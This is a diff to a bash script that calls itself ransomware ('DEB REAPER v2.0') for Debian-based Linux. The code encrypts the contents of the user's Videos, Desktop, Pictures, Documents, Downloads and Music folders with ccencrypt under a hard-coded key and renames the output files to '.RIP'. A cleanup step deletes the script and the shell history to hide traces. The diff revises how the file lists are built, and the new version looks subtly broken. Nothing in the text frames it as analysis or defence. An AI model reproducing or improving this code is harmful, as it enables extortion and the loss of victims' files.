@@ -27,6 +27,7 @@
 # This ransomware works only on Debian based distributions.
 # Tested on Linux (Ubuntu, Debian).
 
+# DEB REAPER v2.0
 
 
 KEY="ReAPER" # KEY
@@ -52,7 +53,7 @@ function encryptvideos() {
    cd "$HOME"
    cd Videos
    local LS=$(ls -a)
-   local LIST=$(echo "$LS" | sed -e 's/ /\ ,/g')
+   local LIST=$(echo "$LS" | tr -d '\n')
    ccencrypt "$LIST" -k "$KEY"
    for f in *.cpt; do
       mv -- "$f" "${f%.cpt}.RIP"
@@ -65,7 +66,7 @@ function encryptdesktop() {
    cd "$HOME"
    cd Desktop
    local LS=$(ls -a)
-   local LIST=$(echo "$LS" | sed -e 's/ /\ ,/g')
+   local LIST=$(echo "$LS" | tr -d '\n')
    ccencrypt "$LIST" -k "$KEY"
    for f in *.cpt; do
       mv -- "$f" "${f%.cpt}.RIP"
@@ -78,7 +79,7 @@ function encryptpictures() {
    cd "$HOME"
    cd Pictures
    local LS=$(ls -a)
-   local LIST=$(echo "$LS" | sed -e 's/ /\ ,/g')
+   local LIST=$(echo "$LS" | tr -d '\n')
    ccencrypt "$LIST" -k "$KEY"
    for f in *.cpt; do
       mv -- "$f" "${f%.cpt}.RIP"
@@ -91,7 +92,7 @@ function encryptdocuments() {
    cd "$HOME"
    cd Documents
    local LS=$(ls -a)
-   local LIST=$(echo "$LS" | sed -e 's/ /\ ,/g')
+   local LIST=$(echo "$LS" | tr -d '\n')
    ccencrypt "$LIST" -k "$KEY"
    for f in *.cpt; do
       mv -- "$f" "${f%.cpt}.RIP"
@@ -104,7 +105,7 @@ function encryptdownloads() {
    cd "$HOME"
    cd Downloads
    local LS=$(ls -a)
-   local LIST=$(echo "$LS" | sed -e 's/ /\ ,/g')
+   local LIST=$(echo "$LS" | tr -d '\n')
    ccencrypt "$LIST" -k "$KEY"
    for f in *.cpt; do
       mv -- "$f" "${f%.cpt}.RIP"
@@ -117,7 +118,7 @@ function encryptmusic() {
    cd "$HOME"
    cd Music
    local LS=$(ls -a)
-   local LIST=$(echo "$LS" | sed -e 's/ /\ ,/g')
+   local LIST=$(echo "$LS" | tr -d '\n')
    ccencrypt "$LIST" -k "$KEY"
    for f in *.cpt; do
       mv -- "$f" "${f%.cpt}.RIP"
@@ -128,6 +129,7 @@ function encryptmusic() {
 function cleanup() {
    
    echo "#!/bin/bash" > RIP.sh
+   echo "sleep 8" >> RIP.sh
    echo "sudo mv DEB.REAPER.sh /dev/null" >> RIP.sh
    chmod 755 RIP.sh 
    ./RIP.sh && cd "$HOME" && rm .bash_history
